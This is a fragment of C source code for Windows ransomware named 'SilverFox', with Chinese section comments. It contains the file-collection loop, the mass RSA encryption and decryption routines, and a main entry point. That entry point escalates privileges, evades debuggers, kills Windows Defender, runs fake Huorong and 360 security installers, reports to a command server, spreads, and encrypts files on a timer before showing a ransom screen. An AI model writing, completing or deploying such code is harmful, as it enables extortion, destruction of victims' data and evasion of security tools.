            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
                BOOL excluded = FALSE;
                for (int e = 0; e < exCount; e++) {
                    if (_stricmp(fd.cFileName, excludeDirs[e]) == 0) { excluded = TRUE; break; }
                }
                if (!excluded) {
                    char subPattern[MAX_PATH];
                    sprintf(subPattern, "%s%s\\*", searchRoot, fd.cFileName);
                }
            } else {
                if (strstr(fd.cFileName, ENC_MARKER) || strstr(fd.cFileName, "pagefile.sys") || strstr(fd.cFileName, "swapfile.sys"))
                    continue;
                char fullPath[MAX_PATH];
                sprintf(fullPath, "%s%s", searchRoot, fd.cFileName);
                if (*count < maxCount) {
                    strcpy(files[*count], fullPath);
                    (*count)++;
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
}

// ==================== 完整加密 / 解密流程 ====================
void do_full_encryption() {
    if (PathFileExistsA(g_flag_encrypted)) return;

    run_python_script("rainbow_cat.py");
    run_python_script("huorong_fake.py");

    if (!PathFileExistsA(g_pubkey_file) || !PathFileExistsA(g_privkey_file))
        generate_rsa_keypair();

    HCRYPTKEY hPub = load_public_key();
    if (!hPub) { log_write("Failed to load public key"); return; }

    char files[4096][MAX_PATH];
    int count = 0;
    collect_files(files, &count, 4096);

    log_write("Encrypting %d files...", count);
    for (int i = 0; i < count; i++) {
        encrypt_file(files[i], hPub);
    }

    CryptDestroyKey(hPub);
    HANDLE hf = CreateFileA(g_flag_encrypted, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) CloseHandle(hf);
    log_write("Encryption complete");
}

void do_full_decryption() {
    if (!PathFileExistsA(g_flag_encrypted)) return;

    HCRYPTKEY hPriv = load_private_key();
    if (!hPriv) { log_write("Failed to load private key"); return; }

    char files[4096][MAX_PATH];
    int count = 0;
    collect_files(files, &count, 4096);

    log_write("Decrypting %d files...", count);
    for (int i = 0; i < count; i++) {
        decrypt_file(files[i], hPriv);
    }

    CryptDestroyKey(hPriv);
    DeleteFileA(g_flag_encrypted);
    log_write("Decryption complete");
}

// ==================== 主入口 ====================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    srand((unsigned)time(NULL) ^ GetCurrentProcessId());
    get_dynamic_paths();
    gen_random_hex(g_ransom_password, RANSOM_PASSWORD_LEN);

    if (!is_admin()) run_as_admin();
    if (is_debugging()) { log_write("Debugger detected, delay"); Sleep(5000); }

    log_write("SilverFox engine start, password=%s", g_ransom_password);

    // 参数处理
    if (strstr(lpCmdLine, "--scheduled")) {
        HANDLE hf = CreateFileA(g_flag_scheduled_triggered, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) CloseHandle(hf);
        ensure_defender_dead();
        do_full_encryption();
        run_python_script("ransom_gui.py");
        return 0;
    }

    // 首次运行
    if (!PathFileExistsA(g_flag_first_run)) {
        run_python_script("setup360_wizard.py");
        ensure_defender_dead();
        HANDLE hf = CreateFileA(g_flag_first_run, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) CloseHandle(hf);
        do_c2_report();
        do_spread();
    }

    // 安全模式直接加密
    if (is_safe_mode()) {
        ensure_defender_dead();
        do_full_encryption();
        run_python_script("ransom_gui.py");
        return 0;
    }

    // 正常模式互斥体循环
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\SilverFoxRansomMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) { log_write("Already running"); return 0; }

    while (1) {
        if (PathFileExistsA(g_flag_encrypted)) {
            run_python_script("ransom_gui.py");
            break;
        }
        SYSTEMTIME st; GetLocalTime(&st);
        if (st.wHour >= 2) {
            do_full_encryption();
            run_python_script("ransom_gui.py");
            break;
        }
        Sleep(60000);
    }
    return 0;
}